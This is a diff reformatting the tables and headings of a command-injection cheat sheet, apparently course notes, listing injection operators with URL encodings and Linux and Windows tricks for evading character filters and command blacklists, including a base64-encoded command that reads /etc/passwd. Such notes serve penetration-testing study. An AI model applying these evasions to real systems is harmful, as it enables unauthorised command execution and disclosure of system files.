@@ -11,7 +11,7 @@ completedOn: 2024-03-04
 ---
 
 | **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
-| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
+| :--------------------- | :---------------------- | :------------------------ | :----------------------------------------- |
 | Semicolon              | `;`                     | `%3b`                     | Both                                       |
 | New Line               | `\n`                    | `%0a`                     | Both                                       |
 | Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
@@ -22,25 +22,25 @@ completedOn: 2024-03-04
 | Sub-Shell              | `$()`                   | `%24%28%29`               | Both (Linux-only)                          |
 
 |**Injection Type**|**Operators**|
-|---|---|
-|SQL Injection|`'` `,` `;` `--` `/* */`|
-|Command Injection|`;` `&&`|
-|LDAP Injection|`*` `(` `)` `&` `\|`|
-|XPath Injection|`'` `or` `and` `not` `substring` `concat` `count`|
+| :--------------- | :---------- |
+|SQL Injection     |`'` `,` `;` `--` `/* */`|
+|Command Injection |`;` `&&`|
+|LDAP Injection    |`*` `(` `)` `&` `\|`|
+|XPath Injection   |`'` `or` `and` `not` `substring` `concat` `count`|
 |OS Command Injection|`;` `&` `\|`|
-|Code Injection|`'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`|
+|Code Injection      |`'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`|
 |Directory Traversal/File Path Traversal|`../` `..\\` `%00`|
-|Object Injection|`;` `&` `\|`|
-|XQuery Injection|`'` `;` `--` `/* */`|
-|Shellcode Injection|`\x` `\u` `%u` `%n`|
-|Header Injection|`\n` `\r\n` `\t` `%0d` `%0a` `%09`
+|Object Injection    |`;` `&` `\|`|
+|XQuery Injection    |`'` `;` `--` `/* */`|
+|Shellcode Injection |`\x` `\u` `%u` `%n`|
+|Header Injection    |`\n` `\r\n` `\t` `%0d` `%0a` `%09`|
 
-# Linux
+## Linux
 
-## Filtered Character Bypass
+### Filtered Character Bypass
 
 | Code                    | Description                                                                        |
-| ----------------------- | ---------------------------------------------------------------------------------- |
+| :---------------------- | :--------------------------------------------------------------------------------- |
 | `printenv`              | Can be used to view all environment variables                                      |
 | **Spaces**              |                                                                                    |
 | `%09`                   | Using tabs instead of spaces                                                       |
@@ -51,10 +51,10 @@ completedOn: 2024-03-04
 | `${LS_COLORS:10:1}`     | Will be replaced with `;`                                                          |
 | `$(tr '!-}' '"-~'<<<[)` | Shift character by one (`[` -> `\`)                                                |
 
-## Blacklisted Command Bypass
+### Blacklisted Command Bypass
 
 | Code                                                         | Description                         |
-| ------------------------------------------------------------ | ----------------------------------- |
+| :----------------------------------------------------------- | :---------------------------------- |
 | **Character Insertion**                                      |                                     |
 | `'` or `"`                                                   | Total must be even                  |
 | `$@` or `\`                                                  | Linux only                          |
@@ -68,25 +68,25 @@ completedOn: 2024-03-04
 | `echo -n 'cat /etc/passwd \| grep 33' \| base64`             | Encode a string with base64         |
 | `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)` | Execute b64 encoded string          |
 
-# Windows
+## Windows
 
-## Filtered Character Bypass
+### Filtered Character Bypass
 
-|Code|Description|
-|---|---|
-|`Get-ChildItem Env:`|Can be used to view all environment variables - (PowerShell)|
-|**Spaces**||
-|`%09`|Using tabs instead of spaces|
-|`%PROGRAMFILES:~10,-5%`|Will be replaced with a space - (CMD)|
-|`$env:PROGRAMFILES[10]`|Will be replaced with a space - (PowerShell)|
-|**Other Characters**||
-|`%HOMEPATH:~0,-17%`|Will be replaced with `\` - (CMD)|
-|`$env:HOMEPATH[0]`|Will be replaced with `\` - (PowerShell)|
+| **Code** | **Description** |
+| :------- | :-------------- |
+|`Get-ChildItem Env:`   |Can be used to view all environment variables - (PowerShell)|
+|**Spaces**             |                                                            |
+|`%09`                  |Using tabs instead of spaces                                |
+|`%PROGRAMFILES:~10,-5%`|Will be replaced with a space - (CMD)                       |
+|`$env:PROGRAMFILES[10]`|Will be replaced with a space - (PowerShell)                |
+|**Other Characters**   |                                                            |
+|`%HOMEPATH:~0,-17%`    |Will be replaced with `\` - (CMD)                           |
+|`$env:HOMEPATH[0]`     |Will be replaced with `\` - (PowerShell)                    |
 
-## Blacklisted Command Bypass
+### Blacklisted Command Bypass
 
-|Code|Description|
-|---|---|
+| **Code** | **Description** |
+| :------- | :-------------- |
 |**Character Insertion**||
 |`'` or `"`|Total must be even|
 |`^`|Windows only (CMD)|
